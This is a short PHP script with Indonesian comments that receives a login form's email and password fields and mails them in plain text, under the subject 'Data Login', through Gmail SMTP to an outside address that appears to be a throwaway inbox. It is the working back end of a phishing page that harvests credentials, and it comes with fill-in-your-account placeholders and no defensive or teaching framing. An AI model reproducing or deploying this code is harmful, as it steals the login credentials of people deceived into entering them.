<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $mail = new PHPMailer(true);
    try {
        // Set up email server untuk mengirim email
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com'; // Jika menggunakan Gmail, ganti dengan SMTP provider Anda
        $mail->SMTPAuth = true;
        $mail->Username = 'your-email@gmail.com'; // Ganti dengan email Anda
        $mail->Password = 'your-email-password'; // Ganti dengan password email Anda
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Set pengirim dan penerima
        $mail->setFrom('your-email@gmail.com', 'Nama Anda');
        $mail->addAddress('vosahe9504@anypng.com', 'Penerima'); // Ganti dengan alamat email yang ingin menerima data

        // Set isi email
        $mail->isHTML(true);
        $mail->Subject = 'Data Login';
        $mail->Body    = "Email: $email<br>Password: $password";

        // Kirim email
        $mail->send();
        echo 'Email berhasil dikirim!';
    } catch (Exception $e) {
        echo "Gagal mengirim email. Error: {$mail->ErrorInfo}";
    }
}
?>
